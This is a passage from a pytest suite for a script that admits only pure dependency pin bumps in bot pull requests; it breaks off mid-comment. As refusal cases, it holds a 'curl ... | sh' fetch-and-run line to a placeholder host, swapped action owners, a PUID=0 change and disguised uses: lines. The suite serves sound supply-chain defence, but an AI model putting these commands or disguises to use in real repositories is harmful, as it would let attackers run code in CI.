"""Tests for scripts/assert-pin-only-diff.py.

This is the check that stands between a dependency bot's pull request and an
unattended merge, so what it refuses matters as much as what it accepts. The
refusal cases below are the ones that would otherwise turn "approve because the
author is renovate[bot]" into write access to main.

No containers and no stack state, so these run anywhere:
    pytest -m scripts tests/test_assert_pin_only_diff.py
"""

import difflib
import subprocess
import sys

import pytest

from conftest import REPO_ROOT

pytestmark = pytest.mark.scripts

SCRIPT = REPO_ROOT / "scripts" / "assert-pin-only-diff.py"

DIGEST = "sha256:" + "a" * 64
# 40 character hex strings, the shape of a GitHub Actions commit pin.
SHA = "a" * 40
OTHER_SHA = "b" * 40


def _check(diff: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        ["python3", str(SCRIPT)],
        input=diff,
        capture_output=True,
        text=True,
        timeout=60,
    )


def _check_workflow(tmp_path, body: str) -> subprocess.CompletedProcess:
    """Grade a workflow diff against a real base built from its own lines.

    `body` is hunk lines as `_diff` takes them. The base is its context and
    removed lines, the head its context and added lines, so the gate reads
    the file whole the way it does for a real pull request; a hand-written
    diff with no base behind it is refused outright (see `parse`).
    """
    before = after = ""
    for line in body.splitlines():
        tag, text = line[:1], line[1:]
        if tag in (" ", "-"):
            before += text + "\n"
        if tag in (" ", "+"):
            after += text + "\n"
    return _check_in_repo(tmp_path, before, after)


def _diff(path: str, body: str, *, header: str = "") -> str:
    return (
        f"diff --git a/{path} b/{path}\n"
        f"{header}"
        f"--- a/{path}\n"
        f"+++ b/{path}\n"
        "@@ -1,3 +1,3 @@\n"
        f"{body}"
    )


# ---------------------------------------------------------------------------
# Accepted: a version or digest moved, and nothing else did
# ---------------------------------------------------------------------------


def test_accepts_an_image_version_and_digest_bump():
    result = _check(
        _diff(
            ".env.example",
            f"-PROMETHEUS_VERSION=v3.7.3@{DIGEST}\n"
            f"+PROMETHEUS_VERSION=v3.7.4@{DIGEST}\n",
        )
    )
    assert result.returncode == 0, result.stdout


def test_accepts_a_pip_pin_bump_inside_a_workflow_run_step(tmp_path):
    result = _check_workflow(
        tmp_path,
        "-          pip install checkov==3.3.2\n"
        "+          pip install checkov==3.3.11\n",
    )
    assert result.returncode == 0, result.stdout


def test_accepts_a_first_time_digest_pin():
    # pinDigests adds a digest to a line that had none, so the two sides differ
    # by its presence. Refusing that would block every pin Renovate creates.
    result = _check(
        _diff(
            ".env.example",
            f"-PROMETHEUS_VERSION=v3.7.3\n+PROMETHEUS_VERSION=v3.7.3@{DIGEST}\n",
        )
    )
    assert result.returncode == 0, result.stdout


def test_accepts_a_hook_rev_bump():
    result = _check(
        _diff(
            ".pre-commit-config.yaml",
            "-    rev: v0.16.1\n+    rev: v0.16.2\n",
        )
    )
    assert result.returncode == 0, result.stdout


# ---------------------------------------------------------------------------
# A GitHub Actions SHA pin's trailing release comment normalizes with it
# ---------------------------------------------------------------------------


def test_accepts_a_github_action_sha_and_comment_bump(tmp_path):
    # The bug this guards: the dependency bot rewrites both halves on a real
    # bump, so the comment moving from `# v7` to `# v7.0.1` alongside the SHA
    # must not read as a structural change. The leading `- name:` line is
    # real diff context, mirroring what `gh pr diff` always carries: without
    # it, _in_block_scalar has nothing to judge from and conservatively
    # refuses.
    result = _check_workflow(
        tmp_path,
        "       - name: Checkout\n"
        "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
        "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f # v7.0.1\n",
    )
    assert result.returncode == 0, result.stdout


def test_accepts_a_github_action_sha_only_bump(tmp_path):
    # The SHA moves, the comment does not: a digest-only refresh of a release
    # that the dependency bot did not consider a new tag.
    result = _check_workflow(
        tmp_path,
        "       - name: Checkout\n"
        "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
        "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f # v7\n",
    )
    assert result.returncode == 0, result.stdout


def test_refuses_a_github_action_swapped_owner_despite_a_matching_comment(tmp_path):
    result = _check_workflow(
        tmp_path,
        "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
        "+        uses: evil/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f # v7\n",
    )
    assert result.returncode == 1


def test_refuses_a_non_release_comment_change(tmp_path):
    result = _check_workflow(
        tmp_path,
        "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
        "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f # pinned\n",
    )
    assert result.returncode == 1


def test_refuses_a_comment_smuggling_extra_text_after_a_version_token(tmp_path):
    result = _check_workflow(
        tmp_path,
        "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
        "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f"
        " # v7.0.1 && curl -s https://example.invalid/x.sh | sh\n",
    )
    assert result.returncode == 1


def test_refuses_a_comment_appearing_where_there_was_none(tmp_path):
    result = _check_workflow(
        tmp_path,
        "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n"
        "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f # v7\n",
    )
    assert result.returncode == 1


# ---------------------------------------------------------------------------
# A first-time GitHub Actions pin normalizes with the bare ref it replaces
# ---------------------------------------------------------------------------


def test_accepts_a_first_time_github_action_pin(tmp_path):
    # #178: pinDigests adding a SHA and release comment to a previously
    # unpinned action, refused before this normalized, despite being nothing
    # but the pin Renovate's own update type exists to add.
    result = _check_workflow(
        tmp_path,
        "       - name: Checkout\n"
        "-        uses: actions/checkout@v7\n"
        "+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
        " # v7\n",
    )
    assert result.returncode == 0, result.stdout


def test_accepts_a_first_time_pin_alongside_a_tag_bump(tmp_path):
    # The release comment does not have to match the old bare tag exactly;
    # Renovate can pin straight to a newer release than the one that was
    # sitting there unpinned, the same as an ordinary bump would.
    result = _check_workflow(
        tmp_path,
        "       - name: Checkout\n"
        "-        uses: actions/checkout@v7\n"
        "+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
        " # v7.0.1\n",
    )
    assert result.returncode == 0, result.stdout


def test_accepts_an_uppercase_first_time_pin(tmp_path):
    # GitHub resolves a uses: SHA the same way regardless of case.
    result = _check_workflow(
        tmp_path,
        "       - name: Checkout\n"
        "-        uses: actions/checkout@v7\n"
        "+        uses: actions/checkout@3D3C42E5AAC5BA805825DA76410C181273BA90B1"
        " # v7\n",
    )
    assert result.returncode == 0, result.stdout


def test_refuses_a_non_hex_40_character_token_as_a_first_time_pin(tmp_path):
    # A third finding on this pattern: RELEASE accepts any alphanumeric
    # run, hex or not, so a 40 character token that is not real hex slips
    # past ACTION_SHA (not hex) and was accepted here regardless, since
    # nothing checked that a first-time pin's target was ever a real SHA.
    # 40 characters is the shape ACTION_SHA exists to own exclusively, so
    # anything that length reaching this pattern is refused outright.
    fake = "0" + "z" * 39
    result = _check_workflow(
        tmp_path,
        f"-        uses: actions/checkout@v7\n"
        f"+        uses: actions/checkout@{fake} # v7\n",
    )
    assert result.returncode == 1


def test_refuses_a_first_time_pin_with_a_swapped_owner(tmp_path):
    # The dependency name stays literal to the left of the `@` for this shape
    # exactly as it does for every other pin type here.
    result = _check_workflow(
        tmp_path,
        "-        uses: actions/checkout@v7\n"
        "+        uses: evil/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
        " # v7\n",
    )
    assert result.returncode == 1


def test_accepts_a_first_time_pin_as_a_yaml_list_item(tmp_path):
    # A step is also legally written as a bare list item, `- uses: ...`,
    # with no name: line above it. The anchor has to allow the optional
    # marker, not just plain indentation.
    result = _check_workflow(
        tmp_path,
        "     steps:\n"
        "-      - uses: actions/checkout@v7\n"
        "+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
        " # v7\n",
    )
    assert result.returncode == 0, result.stdout


def test_refuses_a_first_time_pin_with_no_visible_context():
    # _in_block_scalar has nothing to judge from when the diff shows no
    # line shallower than the change at all (a synthetic edge case a real
    # gh pr diff essentially never produces, since it always carries a
    # line or two of context), and conservatively refuses rather than
    # guess, the same fail closed direction every other shape here takes.
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            "-        uses: actions/checkout@v7\n"
            "+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
            " # v7\n",
        )
    )
    assert result.returncode == 1


def test_refuses_uses_embedded_in_a_run_step_disguised_as_a_first_time_pin(tmp_path):
    # A follow-up CodeRabbit finding on this exact pattern: \buses: is a
    # word-boundary check, not a position check, so it matched the
    # substring "uses:" anywhere on the line, including inside a run:
    # step's own text. Confirmed exploitable before this fix: this exact
    # diff normalized as Pin-only.
    result = _check_workflow(
        tmp_path,
        "-          run: uses: actions/checkout@v7\n"
        "+          run: uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
        " # v7\n",
    )
    assert result.returncode == 1


def test_refuses_a_run_step_version_bump_disguised_as_a_first_time_pin(tmp_path):
    # CodeRabbit's finding on this pull request: an unscoped version of
    # BARE_ACTION_VERSION would let a run: step's trailing tool@v7 normalize
    # the same way a first-time action pin does, so it could grow an
    # unrelated-looking SHA and comment and still read as pin-only. Requiring
    # a uses: field and an owner/repo coordinate immediately before the `@`
    # closes that: this line has neither.
    result = _check_workflow(
        tmp_path,
        "-          run: tool@v7\n"
        "+          run: tool@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n",
    )
    assert result.returncode == 1


def test_refuses_a_first_time_pin_missing_its_release_comment(tmp_path):
    # A bare SHA with nothing trailing it normalizes to "" (ACTION_SHA), not
    # to the " # <version>" a first-time pin's bare side produces, so the two
    # still do not match: Renovate always adds the comment on this update
    # type, and a diff missing it has changed something this script cannot
    # account for as a plain pin.
    result = _check_workflow(
        tmp_path,
        "-        uses: actions/checkout@v7\n"
        "+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n",
    )
    assert result.returncode == 1


# ---------------------------------------------------------------------------
# Refused: anything else, including alongside a legitimate bump
# ---------------------------------------------------------------------------


def test_refuses_a_line_smuggled_in_beside_a_real_bump(tmp_path):
    result = _check_workflow(
        tmp_path,
        "-          pip install checkov==3.3.2\n"
        "+          pip install checkov==3.3.11\n"
        "+          curl -s https://example.invalid/x.sh | sh\n",
    )
    assert result.returncode == 1
    assert "was not a version bump" in result.stdout


def test_refuses_a_swapped_name_at_the_same_version(tmp_path):
    result = _check_workflow(
        tmp_path,
        "-        uses: actions/checkout@v7\n+        uses: attacker/checkout@v7\n",
    )
    assert result.returncode == 1


def test_refuses_a_file_outside_the_pin_paths():
    result = _check(
        _diff(
            "docker-compose-torrent.yml",
            "-    image: lscr.io/linuxserver/sonarr:4.0.19\n"
            "+    image: lscr.io/linuxserver/sonarr:4.0.20\n",
        )
    )
    assert result.returncode == 1
    assert "not a dependency pin file" in result.stdout


def test_refuses_a_new_file_even_in_an_allowed_path():
    result = _check(
        _diff(
            ".github/workflows/extra.yml",
            "+name: extra\n",
            header="new file mode 100644\n",
        )
    )
    assert result.returncode == 1
    assert "new file mode" in result.stdout


def test_refuses_a_rename():
    result = _check(
        "diff --git a/tests/requirements.txt b/tests/requirements-old.txt\n"
        "--- a/tests/requirements.txt\n"
        "+++ b/tests/requirements-old.txt\n"
    )
    assert result.returncode == 1
    assert "renamed to" in result.stdout


def test_refuses_an_empty_diff():
    # A pull request whose diff cannot be read must not read as "nothing wrong
    # with it", which is what an empty allowlist check would have concluded.
    result = _check("")
    assert result.returncode == 1
    assert "empty" in result.stdout


# ---------------------------------------------------------------------------
# Fails closed: the ways an unreadable diff could have passed for a clean one
# ---------------------------------------------------------------------------


def test_refuses_output_with_no_file_header():
    # Truncated or binary output parses into no files at all. Reporting that as
    # "nothing to object to" would approve a diff nobody managed to read.
    result = _check("Binary files a/x.png and b/x.png differ\n")
    assert result.returncode == 1
    assert "no file headers" in result.stdout


def test_refuses_a_file_whose_lines_could_not_be_read():
    result = _check(
        "diff --git a/.env.example b/.env.example\nindex 1111111..2222222 100644\n"
    )
    assert result.returncode == 1
    assert "no readable changed lines" in result.stdout


def test_counts_an_added_line_that_looks_like_a_file_header():
    # `+++x` inside a hunk is an added line reading `++x`. Skipping it as a
    # ---/+++ header would drop it from the comparison, so the smuggled line
    # would never be seen.
    result = _check(
        _diff(
            ".env.example",
            "-PROMETHEUS_VERSION=v3.7.3\n"
            "+PROMETHEUS_VERSION=v3.7.4\n"
            "+++PATH=/tmp/evil\n",
        )
    )
    assert result.returncode == 1
    assert "was not a version bump" in result.stdout


# ---------------------------------------------------------------------------
# Only a number in a pin position counts as a version
# ---------------------------------------------------------------------------


def test_refuses_a_numeric_change_that_is_not_a_pin():
    # PUID=0 would run every container as root, and it is a digit change on a
    # line in an allowed file, so a rule that normalized any number would have
    # accepted it.
    result = _check(_diff(".env.example", "-PUID=1000\n+PUID=0\n"))
    assert result.returncode == 1


def test_refuses_a_changed_yaml_number(tmp_path):
    result = _check_workflow(
        tmp_path,
        "-    timeout-minutes: 25\n+    timeout-minutes: 600\n",
    )
    assert result.returncode == 1


def test_refuses_a_pin_that_changes_shape_rather_than_value():
    result = _check(
        _diff(
            "tests/requirements.txt",
            "-pytest==8.4.1\n+pytest>=8.4.1\n",
        )
    )
    assert result.returncode == 1


def test_accepts_a_hash_style_tag():
    # linuxserver publishes lazylibrarian as a commit hash with a build suffix,
    # not as dotted numbers. Refusing that meant refusing a real bump, which is
    # what happened to #62.
    result = _check(
        _diff(
            ".env.example",
            # pragma: allowlist secret - an image tag, and the hash in it is
            # what detect-secrets reads as entropy. It is published on Docker
            # Hub.
            "-LAZYLIBRARIAN_VERSION=40a389ea-ls309\n"  # pragma: allowlist secret
            "+LAZYLIBRARIAN_VERSION=40a389ea-ls310\n",  # pragma: allowlist secret
        )
    )
    assert result.returncode == 0, result.stdout


def test_still_refuses_a_non_pin_number_after_widening_the_token():
    # The widened token must not start accepting numbers that are not pins.
    result = _check(_diff(".env.example", "-PUID=1000\n+PUID=0\n"))
    assert result.returncode == 1


def test_accepts_a_sha_prefixed_tag():
    # korsync was pinned to `sha-<hash>` when this case was written, so the
    # token cannot be required to start with a digit. Requiring one refused this
    # form. korsync has since moved to a plain `0.2.3`, and the literal stays
    # here rather than being read from .env.example so that the shape is tested
    # whatever the file happens to pin: what is under test is the script's
    # tolerance for the form, not that anything currently uses it.
    old = "sha-7bcefd34e9f6738ce34ccda338aedd316baa05c9"  # pragma: allowlist secret
    new = "sha-8adf1129c7a0d51e0b2a7f4e93a1b0c5d6e7f809"  # pragma: allowlist secret
    result = _check(
        _diff(".env.example", f"-KORSYNC_VERSION={old}\n+KORSYNC_VERSION={new}\n")
    )
    assert result.returncode == 0, result.stdout


def test_accepts_a_floating_tag_change():
    result = _check(
        _diff(".env.example", "-NGINX_VERSION=stable-alpine\n+NGINX_VERSION=stable\n")
    )
    assert result.returncode == 0, result.stdout


def test_still_refuses_a_swapped_image_name_with_the_widest_token():
    # The name sits left of the prefix and stays literal, which is what keeps
    # the permissive token safe.
    result = _check(
        _diff(
            ".pre-commit-config.yaml",
            "-        entry: docker run aquasec/trivy:0.71.2\n"
            "+        entry: docker run attacker/trivy:0.71.2\n",
        )
    )
    assert result.returncode == 1


def test_accepts_a_tool_versions_bump():
    # .tool-versions writes `<tool> <version>` with only a space between them,
    # which none of the prefix rules can see. #67 was refused for it.
    result = _check(_diff(".tool-versions", "-pre-commit 4.5.1\n+pre-commit 4.6.2\n"))
    assert result.returncode == 0, result.stdout


def test_refuses_a_swapped_tool_name_in_tool_versions():
    result = _check(
        _diff(".tool-versions", "-pre-commit 4.5.1\n+attacker-tool 4.5.1\n")
    )
    assert result.returncode == 1


def test_refuses_an_extra_tool_added_to_tool_versions():
    result = _check(
        _diff(".tool-versions", "-pre-commit 4.5.1\n+pre-commit 4.6.2\n+evil 1.0.0\n")
    )
    assert result.returncode == 1


def test_accepts_a_pip_floor_bump_in_test_requirements():
    # tests/requirements.txt pins floors with `>=`, not exact versions with
    # `==`, and `>=` was missing from the prefix set until PR #94 sat failing
    # `Pin Only` on it. Every line in that file uses it, so no bump of it could
    # ever have graded pin-only.
    result = _check(_diff("tests/requirements.txt", "-json5>=0.12.1\n+json5>=0.15.0\n"))
    assert result.returncode == 0, result.stdout


def test_refuses_a_swapped_package_name_on_a_floor_pin():
    result = _check(
        _diff("tests/requirements.txt", "-json5>=0.12.1\n+attacker>=0.15.0\n")
    )
    assert result.returncode == 1


def test_refuses_a_floor_pin_becoming_an_exact_pin():
    # The prefix is captured and put back, so changing the pin's shape is a
    # difference even when the package and the version are both plausible.
    result = _check(_diff("tests/requirements.txt", "-json5>=0.12.1\n+json5==0.15.0\n"))
    assert result.returncode == 1


# ---------------------------------------------------------------------------
# A uses: line inside a run: | block scalar is not a real GitHub Actions
# field, and no pattern here may treat it as a pin
# ---------------------------------------------------------------------------


def test_refuses_a_first_time_pin_disguise_inside_a_run_step(tmp_path):
    # A CodeRabbit review found and confirmed this: normalize() has no YAML
    # awareness, so an indented uses: line inside a run: | block, plain
    # shell text, matched ACTION_SHA and BARE_ACTION_VERSION the same way a
    # real GitHub Actions uses: field does.
    result = _check_workflow(
        tmp_path,
        "       - name: Something\n"
        "         run: |\n"
        "           echo hello\n"
        "-          uses: fake/action@v7\n"
        "+          uses: fake/action@3d3c42e5aac5ba805825da76410c181273ba90b1"
        " # v7\n",
    )
    assert result.returncode == 1


def test_refuses_a_bare_tag_disguise_inside_a_run_step(tmp_path):
    # A second gap the same review surfaced: skipping ACTION_SHA and
    # BARE_ACTION_VERSION for a block scalar line was not enough on its
    # own here, because VERSION's own @ prefix independently matched the
    # same uses: owner/repo@version shape, with no SHA or comment
    # involved at all. Confirmed exploitable before ACTION_REF_VERSION
    # split that prefix out and gated it the same way: this exact diff
    # read as Pin-only.
    result = _check_workflow(
        tmp_path,
        "       - name: Something\n"
        "         run: |\n"
        "           echo hello\n"
        "-          uses: fake/action@v7\n"
        "+          uses: fake/action@v8\n",
    )
    assert result.returncode == 1


def test_accepts_a_pip_pin_bump_inside_a_block_scalar_run_step(tmp_path):
    # The block scalar check must not cost this repository's own
    # documented shape: a pip pin bump legitimately lives inside a run: |
    # step (see VERSION's own comment), and has nothing to do with the
    # uses: disguise the check above exists to catch.
    result = _check_workflow(
        tmp_path,
        "      - name: Install\n"
        "        run: |\n"
        "-          pip install checkov==3.3.2\n"
        "+          pip install checkov==3.3.11\n",
    )
    assert result.returncode == 0, result.stdout


def test_accepts_a_floating_tag_bump_outside_a_block_scalar(tmp_path):
    # An action that has never been SHA-pinned can still move from one
    # floating tag to another; ACTION_REF_VERSION covers this ordinary
    # case (distinct from a first-time pin, which BARE_ACTION_VERSION
    # covers), and it is not inside a block scalar here, so it still
    # normalizes and accepts.
    result = _check_workflow(
        tmp_path,
        "      - name: Checkout\n"
        "-        uses: actions/checkout@v7\n"
        "+        uses: actions/checkout@v7.1.0\n",
    )
    assert result.returncode == 0, result.stdout


def test_refuses_an_action_ref_disguise_outside_a_block_scalar(tmp_path):
    # A CodeRabbit review found ACTION_REF_VERSION itself was still
    # unscoped: its own bare `@` prefix matched anywhere on a line, block
    # scalar or not, so a plain single-line `run:` step's own text with
    # an `@version`-shaped token normalized the same way a real `uses:`
    # field does, with no block scalar and no `uses:` field involved at
    # all. Confirmed exploitable before ACTION_REF_VERSION was anchored
    # to a genuine `uses:` field: this exact diff read as Pin-only.
    result = _check_workflow(
        tmp_path,
        "      - name: Run\n"
        "-        run: echo fake/action@v7\n"
        "+        run: echo fake/action@v8\n",
    )
    assert result.returncode == 1


def test_refuses_a_first_time_pin_disguise_inside_a_sequence_item_scalar(tmp_path):
    # A CodeRabbit review found BLOCK_SCALAR_OPENER itself was still too
    # narrow: it required a colon before the scalar indicator, so a bare
    # sequence-item header with no key in front, `- |`, was not
    # recognized as opening a block scalar. A uses: line nested under one
    # then reached pin normalization as ordinary YAML structure instead
    # of literal block scalar content. Confirmed exploitable before
    # BLOCK_SCALAR_OPENER also matched a standalone sequence-item header.
    result = _check_workflow(
        tmp_path,
        "        scripts:\n"
        "          - |\n"
        "-            uses: fake/action@v7\n"
        "+            uses: fake/action@v8\n",
    )
    assert result.returncode == 1


# ---------------------------------------------------------------------------
# Whole-file block scalar judgment: a real git diff against a real base
# ---------------------------------------------------------------------------

STEP_WITH_COMMENT = (
    "jobs:\n"
    "  scan:\n"
    "    runs-on: ubuntu-latest\n"
    "    steps:\n"
    "      - name: Upload the scan\n"
    "        # A comment between the step's name and its uses: line, long\n"
    "        # enough that three lines of diff context above the pin never\n"
    "        # reach anything shallower than it.\n"
    "        uses: github/codeql-action/upload-sarif@{sha} # v4\n"
    "        with:\n"
    "          sarif_file: scan.sarif\n"
)

NESTED_IN_RUN = (
    "jobs:\n"
    "  build:\n"
    "    runs-on: ubuntu-latest\n"
    "    steps:\n"
    "      - name: Build\n"
    "        run: |\n"
    "          if true; then\n"
    "            uses: fake/action@{sha} # v4\n"
    "          fi\n"
)


def _git(repo, *args: str) -> str:
    return subprocess.run(
        ["git", "-C", str(repo), "-c", "user.name=t", "-c", "user.email=t@t", *args],
        capture_output=True,
        text=True,
        check=True,
    ).stdout


def _check_in_repo(tmp_path, before: str, after: str, *, base: str | None = None):
    """Commit `before`, diff it against `after`, and grade that diff with a
    copy of the script whose checkout holds `base` (default: `before`)."""
    workflow = tmp_path / ".github" / "workflows" / "scan.yml"
    workflow.parent.mkdir(parents=True)
    (tmp_path / "scripts").mkdir()
    (tmp_path / "scripts" / SCRIPT.name).write_bytes(SCRIPT.read_bytes())
    _git(tmp_path, "init", "-q")
    workflow.write_text(before)
    _git(tmp_path, "add", ".")
    _git(tmp_path, "commit", "-q", "-m", "base")
    workflow.write_text(after)
    diff = _git(tmp_path, "diff")
    workflow.write_text(before if base is None else base)
    return subprocess.run(
        [sys.executable, str(tmp_path / "scripts" / SCRIPT.name)],
        input=diff,
        capture_output=True,
        text=True,
        timeout=60,
        check=False,
    )


def test_accepts_a_pin_whose_step_name_sits_above_a_comment(tmp_path):
    # ivan-pinatti-labs/rsync-crypt#105: the three lines of context above
    # the pin are all comments at its own indentation, so the diff alone
    # shows nothing shallower and the fallback refuses. Read whole, the
    # file proves the line is ordinary YAML structure.
    result = _check_in_repo(
        tmp_path,
        STEP_WITH_COMMENT.format(sha=SHA),
        STEP_WITH_COMMENT.format(sha=OTHER_SHA),
    )
    assert result.returncode == 0, result.stdout


def test_refuses_a_uses_line_nested_deep_inside_a_run_block(tmp_path):
    # The gap `_in_block_scalar` documents: judged from context, the
    # nearest shallower line is `if true; then`, which is not an opener,
    # so the fallback would read this shell text as a step. The whole file
    # shows it sits inside `run: |`.
    result = _check_in_repo(
        tmp_path,
        NESTED_IN_RUN.format(sha=SHA),
        NESTED_IN_RUN.format(sha=OTHER_SHA),
    )
    assert result.returncode == 1, result.stdout


def test_falls_back_to_the_diff_when_main_has_moved_the_file(tmp_path):
    # The checkout no longer matches the diff's base blob, so nothing read
    # from it can be trusted to describe this diff: the context judgment
    # applies again, and it refuses the #105 shape as it always did.
    result = _check_in_repo(
        tmp_path,
        STEP_WITH_COMMENT.format(sha=SHA),
        STEP_WITH_COMMENT.format(sha=OTHER_SHA),
        base=STEP_WITH_COMMENT.format(sha=SHA) + "# moved on main\n",
    )
    assert result.returncode == 1, result.stdout


def test_falls_back_when_the_hunks_disagree_with_the_base(tmp_path):
    # A matching blob id with a context line the base does not have means
    # the diff was not taken against this file; the whole-file view is
    # discarded rather than trusted, and the context judgment refuses.
    before = STEP_WITH_COMMENT.format(sha=SHA)
    after = STEP_WITH_COMMENT.format(sha=OTHER_SHA)
    assert _check_in_repo(tmp_path, before, after).returncode == 0
    workflow = tmp_path / ".github" / "workflows" / "scan.yml"
    workflow.write_text(after)
    diff = _git(tmp_path, "diff").replace("shallower than it.", "else at all.")
    workflow.write_text(before)
    result = subprocess.run(
        [sys.executable, str(tmp_path / "scripts" / SCRIPT.name)],
        input=diff,
        capture_output=True,
        text=True,
        timeout=60,
        check=False,
    )
    assert result.returncode == 1, result.stdout


def test_falls_back_when_a_hunk_is_shorter_than_its_header(tmp_path):
    # Valid context, but the header declares more lines than the body
    # carries: a truncated diff. The whole-file view is discarded rather
    # than filled in from the base, and the context judgment refuses.
    before = STEP_WITH_COMMENT.format(sha=SHA)
    after = STEP_WITH_COMMENT.format(sha=OTHER_SHA)
    assert _check_in_repo(tmp_path, before, after).returncode == 0
    workflow = tmp_path / ".github" / "workflows" / "scan.yml"
    workflow.write_text(after)
    lines = _git(tmp_path, "diff").splitlines()
    diff = "\n".join(lines[:-1]) + "\n"
    workflow.write_text(before)
    result = subprocess.run(
        [sys.executable, str(tmp_path / "scripts" / SCRIPT.name)],
        input=diff,
        capture_output=True,
        text=True,
        timeout=60,
        check=False,
    )
    assert result.returncode == 1, result.stdout


ANCHORED_RUN = (
    "jobs:\n"
    "  build:\n"
    "    runs-on: ubuntu-latest\n"
    "    steps:\n"
    "      - name: Build\n"
    "        run: {props} |2-\n"
    "            uses: fake/action@{sha} # v4\n"
)

DASH_NAME_SIBLING = (
    "jobs:\n"
    "  scan:\n"
    "    runs-on: ubuntu-latest\n"
    "    steps:\n"
    "      - name: |\n"
    "          Upload the scan\n"
    "        uses: github/codeql-action/upload-sarif@{sha} # v4\n"
)


@pytest.mark.parametrize("props", ["&body", "!!str"])
def test_refuses_a_uses_line_inside_an_anchored_or_tagged_run_block(tmp_path, props):
    # YAML allows an anchor or a tag between the colon and the block scalar
    # indicator, and `run: &body |2-` opens a scalar just as `run: |` does.
    # BLOCK_SCALAR_OPENER missed both until a CodeRabbit review found it.
    result = _check_in_repo(
        tmp_path,
        ANCHORED_RUN.format(props=props, sha=SHA),
        ANCHORED_RUN.format(props=props, sha=OTHER_SHA),
    )
    assert result.returncode == 1, result.stdout


@pytest.mark.parametrize("props", ["&body", "!!str"])
def test_refuses_an_anchored_or_tagged_run_block_from_context(props):
    # The same shape judged from the diff alone, as when main has moved on.
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            f"         run: {props} |2-\n"
            f"-            uses: fake/action@{SHA} # v4\n"
            f"+            uses: fake/action@{OTHER_SHA} # v4\n",
        )
    )
    assert result.returncode == 1, result.stdout


def test_accepts_a_uses_line_beside_a_dash_name_block(tmp_path):
    # For `- name: |` the scalar's floor is the key's column, not the dash's:
    # a `uses:` at that column is the step's next key, which YAML (PyYAML
    # confirms) reads as a sibling rather than as scalar content.
    result = _check_in_repo(
        tmp_path,
        DASH_NAME_SIBLING.format(sha=SHA),
        DASH_NAME_SIBLING.format(sha=OTHER_SHA),
    )
    assert result.returncode == 0, result.stdout


PROPERTIES_ON_STEP = (
    "jobs:\n"
    "  scan:\n"
    "    runs-on: ubuntu-latest\n"
    "    steps:\n"
    "      - {props} name: |\n"
    "          Upload the scan\n"
    "        uses: github/codeql-action/upload-sarif@{sha} # v4\n"
)


@pytest.mark.parametrize("props", ["&step", "!!map"])
def test_accepts_a_uses_line_beside_an_anchored_or_tagged_step(tmp_path, props):
    # Properties leading a compact mapping, `- &step name: |`, belong to the
    # mapping, which starts at their column; `uses:` there is a sibling key
    # (PyYAML confirms), not scalar content.
    result = _check_in_repo(
        tmp_path,
        PROPERTIES_ON_STEP.format(props=props, sha=SHA),
        PROPERTIES_ON_STEP.format(props=props, sha=OTHER_SHA),
    )
    assert result.returncode == 0, result.stdout


SPLIT_INDICATOR_RUN = (
    "jobs:\n"
    "  build:\n"
    "    runs-on: ubuntu-latest\n"
    "    steps:\n"
    "      - name: Build\n"
    "        run: {props}\n"
    "          |\n"
    "          uses: fake/action@{sha} # v4\n"
)


@pytest.mark.parametrize("props", ["&body", "!!str", ""])
def test_refuses_a_uses_line_under_a_standalone_indicator(tmp_path, props):
    # `run: &body` (or a bare `run:`) followed by an indented `|` is a block
    # scalar too, and its content may sit at the `|` line's own column
    # (PyYAML confirms). Raised by CodeRabbit on
    # ivan-pinatti-labs/pre-commit-checklists#50.
    result = _check_in_repo(
        tmp_path,
        SPLIT_INDICATOR_RUN.format(props=props, sha=SHA),
        SPLIT_INDICATOR_RUN.format(props=props, sha=OTHER_SHA),
    )
    assert result.returncode == 1, result.stdout


@pytest.mark.parametrize("props", ["&body", "!!str", ""])
def test_refuses_a_standalone_indicator_from_context(props):
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            f"         run: {props}\n"
            "           |\n"
            f"-          uses: fake/action@{SHA} # v4\n"
            f"+          uses: fake/action@{OTHER_SHA} # v4\n",
        )
    )
    assert result.returncode == 1, result.stdout


SEQUENCE_ITEM_SPLIT = (
    "jobs:\n"
    "  build:\n"
    "    runs-on: ubuntu-latest\n"
    "    steps:\n"
    "      - name: Build\n"
    "        run:\n"
    "          {item}\n"
    "            |\n"
    "            uses: fake/action@{sha} # v4\n"
)

COMMENT_BEFORE_OPENER = (
    "jobs:\n"
    "  build:\n"
    "    runs-on: ubuntu-latest\n"
    "    steps:\n"
    "      - name: Build\n"
    "        # note: |\n"
    "        run: &body |-\n"
    "          uses: fake/action@{sha} # v4\n"
)


@pytest.mark.parametrize("item", ["- &body", "- !!str", "- run:"])
def test_refuses_a_uses_line_under_a_sequence_item_split_indicator(tmp_path, item):
    # A lone indicator's owner, and so its content's floor, depends on lines
    # above it; `- &body` then `|` makes the item itself the scalar. Every
    # line after a lone indicator now counts as content. Raised by CodeRabbit
